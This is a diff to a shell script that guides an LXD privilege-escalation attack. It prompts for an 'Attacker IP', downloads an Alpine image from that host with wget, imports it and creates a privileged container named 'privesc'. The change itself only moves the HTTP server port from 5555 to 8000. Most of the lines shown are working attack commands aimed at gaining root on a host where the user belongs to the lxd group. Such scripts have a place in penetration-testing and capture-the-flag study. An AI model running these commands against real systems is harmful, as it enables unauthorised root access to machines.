@@ -14,11 +14,11 @@ echo "cd lxd-alpine-builder"
 echo "./build-alpine"
 echo "Wait for the program to finish. At the end you should get a new file called for example:"
 echo "alpine-v3.18-x86_64-20221014_1303.tar.gz"
-echo "Now start a Python server from where the new alpine file is: python3 -m http.server 5555"
-echo "The default port of the http.server is set to 5555"
+echo "Now start a Python server from where the new alpine file is: python3 -m http.server"
+echo "The default port of the http.server is set to 8000"
 read -p "Attacker IP is (Example: 10.10.10.10): " AttackerIP
 read -p "The new alpine file is called: " AlpineBuild
-wget http://$AttackerIP:5555/$AlpineBuild
+wget http://$AttackerIP:8000/$AlpineBuild
 lxc image import $AlpineBuild --alias alpine
 lxc image list
 lxc init alpine privesc -c security.privileged=true
